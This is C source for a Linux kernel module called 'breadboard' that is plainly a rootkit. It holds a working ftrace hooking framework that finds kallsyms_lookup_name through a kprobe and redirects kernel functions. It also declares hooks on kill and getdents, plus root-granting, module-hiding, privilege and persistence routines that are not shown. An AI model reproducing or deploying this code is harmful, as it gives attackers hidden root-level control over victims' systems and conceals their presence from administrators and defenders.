#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>

#define HOOK(_name, _hook, _orig)	\
{			\
	.name = (_name),		\
	.function = (_hook),		\
	.original = (_orig),		\
}

struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned long d_reclen;
	char d_name[];
};

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};
// prototypes
int fh_install_hook(struct ftrace_hook *);
int fh_install_hooks(struct ftrace_hook *, size_t);
void fh_remove_hook(struct ftrace_hook *);
void fh_remove_hooks(struct ftrace_hook *, size_t);
asmlinkage int hook_kill(const struct pt_regs *);
asmlinkage int hook_getdents64(const struct pt_regs *);
asmlinkage int hook_getdents(const struct pt_regs *);
void set_root(void);
void hide_module(void);
void show_module(void);
static int privilege(void);
static int privilege_removal(void);
int persistance(void);
int persistance_removal(void);

static int fh_resolve_hook_address(struct ftrace_hook *hook){
	// the kallsyms_lookup_name portion of this is used to find the address of kallsyms by registering a kprobe 
	// at that symbol address and grabbing the address of the kprobe.
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
	hook->address = kallsyms_lookup_name(hook->name);
	if(!hook->address){
		printk(KERN_INFO "breadboard: unresolved symbol %s\n", hook->name);
		return -ENOENT;
	}
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs){
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
	regs->ip = (unsigned long) hook->function;
}

int fh_install_hook(struct ftrace_hook *hook){
	int err;
	err = fh_resolve_hook_address(hook);
	if(err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
		| FTRACE_OPS_FL_RECURSION
		| FTRACE_OPS_FL_IPMODIFY;
	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if(err){
		printk(KERN_DEBUG "breadboard: ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}
	err = register_ftrace_function(&hook->ops);
	if(err){
		printk(KERN_DEBUG "breadboard: register_ftrace_function() failed: %d\n", err);
		return err;
	}
	return 0;
}

void fh_remove_hook(struct ftrace_hook *hook){
	int err;
	err = unregister_ftrace_function(&hook->ops);
	if(err){
		printk(KERN_DEBUG "breadboard: unregister_ftrace_function() failed: %d\n", err);
	}
	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if(err){
		printk(KERN_DEBUG "breadboard: ftrace_set_filter_ip() failed: %d\n", err);
	}
}
int fh_install_hooks(struct ftrace_hook *hooks, size_t count){
	int err;
	size_t i;
	for(i = 0; i < count; i++){
		err = fh_install_hook(&hooks[i]);
		if(err)
			goto error;
	}
	return 0;
error:
	while(i!=0){
		fh_remove_hook(&hooks[--i]);
	}
	return err;
}
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count){
	size_t i;

	for(i = 0; i < count; i++)
		fh_remove_hook(&hooks[i]);
}
